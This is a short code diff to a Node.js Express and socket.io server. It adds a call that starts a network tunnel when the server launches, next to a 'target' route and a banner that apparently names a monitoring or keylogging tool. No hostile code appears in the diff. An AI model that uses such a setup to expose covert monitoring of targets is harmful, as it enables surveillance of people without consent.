@@ -4,7 +4,7 @@ const express = require("express")
 const socketIo = require("socket.io")
 const http = require("http")
 const path = require("path")
-
+const { startTunnel } = require("./utils/tunnel")
 
 const app = express()
 const server = http.createServer(app)
@@ -22,7 +22,8 @@ app.use("/", require("./router/index"))
 app.use("/t", require("./router/target"))
 
 const PORT = process.env.PORT || 3441
-server.listen(PORT, () => {
+server.listen(PORT, async () => {
+
     console.log(`
 ██╗  ██╗███████╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗
 ██║ ██╔╝██╔════╝╚██╗ ██╔╝████╗ ████║██╔═══██╗████╗  ██║
@@ -33,5 +34,6 @@ server.listen(PORT, () => {
                             - Madhanmaaz
                             - https://madhanmaaz.netlify.app                                           
 `)
+    await startTunnel()
     console.log(`RUNNING ON: http://127.0.0.1:${PORT}`)
 })
